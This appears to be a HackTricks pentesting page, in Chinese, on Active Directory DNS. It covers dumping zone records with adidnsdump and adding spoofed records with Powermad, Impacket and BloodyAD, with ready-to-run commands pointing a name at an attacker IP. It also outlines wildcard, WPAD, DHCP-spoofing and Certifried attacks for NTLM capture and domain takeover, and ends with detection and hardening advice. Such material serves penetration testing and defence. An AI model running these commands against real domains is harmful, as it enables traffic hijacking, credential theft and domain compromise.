# AD DNS 记录

{{#include ../../banners/hacktricks-training.md}}

默认情况下，**任何用户**都可以在 Active Directory 中**枚举所有 DNS 记录**，类似于区域传输（用户可以列出 AD 环境中 DNS 区域的子对象）。

工具 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) 使得**枚举**和**导出**区域中的**所有 DNS 记录**成为可能，以便于内部网络的侦查。
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
> adidnsdump v1.4.0 (2025年4月) 添加了 JSON/可grep输出 (`--json`)、多线程 DNS 解析以及在绑定到 LDAPS 时对 TLS 1.2/1.3 的支持

有关更多信息，请阅读 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## 创建/修改记录 (ADIDNS 欺骗)

由于 **Authenticated Users** 组默认在区域 DACL 上具有 **Create Child** 权限，任何域帐户（或计算机帐户）都可以注册额外的记录。这可以用于流量劫持、NTLM 继电器强迫甚至完全域妥协。

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py 随 Impacket ≥0.12.0 一起提供)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 常见攻击原语

1. **通配符记录** – `*.<zone>` 将 AD DNS 服务器变成类似于 LLMNR/NBNS 欺骗的企业范围响应器。可以被滥用来捕获 NTLM 哈希或将其中继到 LDAP/SMB。 （需要禁用 WINS 查找。）
2. **WPAD 劫持** – 添加 `wpad`（或指向攻击者主机的 **NS** 记录以绕过全球查询阻止列表）并透明地代理出站 HTTP 请求以收集凭据。 微软修补了通配符/DNAME 绕过（CVE-2018-8320），但 **NS 记录仍然有效**。
3. **过期条目接管** – 声称之前属于工作站的 IP 地址，相关的 DNS 条目仍将解析，从而启用基于资源的受限委派或 Shadow-Credentials 攻击，而无需触碰 DNS。
4. **DHCP → DNS 欺骗** – 在默认的 Windows DHCP+DNS 部署中，同一子网的未经身份验证的攻击者可以通过发送伪造的 DHCP 请求覆盖任何现有的 A 记录（包括域控制器），这些请求触发动态 DNS 更新（Akamai “DDSpoof”，2023）。 这使得在 Kerberos/LDAP 上进行中间人攻击，并可能导致完全的域接管。
5. **Certifried (CVE-2022-26923)** – 更改您控制的计算机帐户的 `dNSHostName`，注册匹配的 A 记录，然后请求该名称的证书以冒充 DC。 工具如 **Certipy** 或 **BloodyAD** 完全自动化该流程。

---

## 检测与加固

* 拒绝 **Authenticated Users** 在敏感区域的 *创建所有子对象* 权限，并将动态更新委派给专用帐户用于 DHCP。
* 如果需要动态更新，将区域设置为 **仅安全**，并在 DHCP 中启用 **名称保护**，以便只有拥有者计算机对象可以覆盖其自己的记录。
* 监控 DNS 服务器事件 ID 257/252（动态更新），770（区域传输）和 LDAP 写入到 `CN=MicrosoftDNS,DC=DomainDnsZones`。
* 用故意良性的记录或通过全球查询阻止列表阻止危险名称（`wpad`，`isatap`，`*`）。
* 保持 DNS 服务器打补丁 – 例如，RCE 漏洞 CVE-2024-26224 和 CVE-2024-26231 达到 **CVSS 9.8**，并且可以远程利用针对域控制器。

## 参考文献

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, 仍然是通配符/WPAD 攻击的事实参考)
* Akamai – “通过滥用 DHCP DNS 动态更新来欺骗 DNS 记录” (2023年12月)
{{#include ../../banners/hacktricks-training.md}}
